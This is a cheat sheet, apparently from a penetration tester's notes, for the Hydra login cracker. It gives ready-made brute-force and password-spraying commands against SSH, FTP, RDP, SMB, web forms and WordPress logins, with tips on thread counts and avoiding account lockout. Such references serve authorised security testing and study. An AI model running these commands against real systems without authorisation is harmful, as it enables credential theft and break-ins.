+++
title = "Hydra"
+++

- https://hydra.cc/docs/intro/
- https://brandonrussell.io/OSCP-Notes/My%20Hydra%20Cheatsheet.html

Hydra is a parallelized login cracker that supports numerous protocols to attack quickly and flexibly, and new modules are easy to add.

**NOTE: use `netexec` for Windows AD environments instead**

## Core Flags

```bash
-f      : Stop immediately when a credential is found
-V      : Verbose (Check if service is responding)
-t <N>  : Number of parallel tasks (threads)
-l <USER> : Single username
-L <USER_LIST> : Username list file
-p <PASSWORD> : Single password
-P <WORDLIST> : Password wordlist file
-o <OUTPUT> : Output file
-s <PORT> : Port if nonstandard
-M <TARGET_FILE> : Targets list file
```

```bash
hydra -x -h

# Generate and test passwords ranging from 6 to 8 characters of an alphanumeric set
-x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```
## Protocol-Specific Examples

### SSH / FTP / RDP / SMB

```bash
# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
hydra -t 4 -l <USER> -P <WORDLIST> -f -V ssh://<TARGET>

# FTP brute-force
hydra -l <USER> -P <WORDLIST> -f -V ftp://<TARGET>

# RDP brute-force
hydra -l <USER> -P <WORDLIST> -f -V rdp://<TARGET>

# SMB brute-force
hydra -l <USER> -P <WORDLIST> -f -V smb://<TARGET>
```

## Web Forms

### HTTP-POST

**Syntax:** `"/PATH:BODY:CONDITION=STRING"`
- Use browser F12 > Network > DevTools, web proxy, or `-d` to capture the actual POST request. Look for the form action URL and input field names.
- Use `^USER^` and `^PASS^` as placeholders in `BODY`
- Condition String: `hydra -U http-post-form`
    - **Important**: you can only define S= *OR* F= - not both 
    - `F=<FAILURE_STRING>` (default) specifies the failure response text to detect failed logins
        - **too many false positives means bad failure string**
    - `S=<SUCCESS_STRING>
        - `S=302` means a successful login due to an HTTP 302 page forward redirect

**Check with `-dt1` for condition strings**
```bash
# S=302 for login redirects (and no login error)
hydra -l <USER> -P <WORDLIST> -f <TARGET> http-post-form "/<PAGE>:<USERNAME_LABEL>=^USER^&<PASSWORD_LABEL>=^PASS^:S=302" -V
# F=X for bad logins give an error
hydra -l <USER> -P <WORDLIST> -f <TARGET> http-post-form "/<PAGE>:<USERNAME_LABEL>=^USER^&<PASSWORD_LABEL>=^PASS^:F=invalid" -V
```

### HTTP Basic Auth

A basic form of authentication, usually when a web resource is restricted, a pop-up window will appear asking for username and password. From a HTTP header perspective it is the base64 version of `<USERNAME>:<PASSWORD>` like:

```bash
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

```bash
hydra -l <USER> -P <WORDLIST> -f <TARGET> http-get -V
```

### WordPress Specific

```bash
# WordPress brute-force login form with a complex request string (ONLINE - use small wordlist)
hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -VF -o hydra_wp_login.txt

# Alternative WordPress syntax
hydra -l <USER> -P <WORDLIST> <TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V -f
```

## Password Spraying

Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!

**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.

```bash
# SSH password spraying (1 password vs many users)
hydra -L <USER_LIST> -p '<PASSWORD>' -f -V -t 4 ssh://<TARGET>

# Web form password spraying
hydra -L <USER_LIST> -p '<PASSWORD>' -f -V <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## Important Notes

- **Account Lockout Risk**: Brute-forcing (many passwords vs 1 user) has a **RISK of account lockout** due to account lockout policy. Use small wordlists and be cautious.
- **Thread Count**: Use `-t 4` for SSH to avoid overwhelming the service. Web forms can handle higher thread counts like `-t 16`.
- **Wordlist Selection**: For online attacks, use small wordlists (e.g., top 1000 passwords) to minimize lockout risk and reduce time.
- **Output**: Always use `-o <OUTPUT_FILE>` to save results for later analysis.
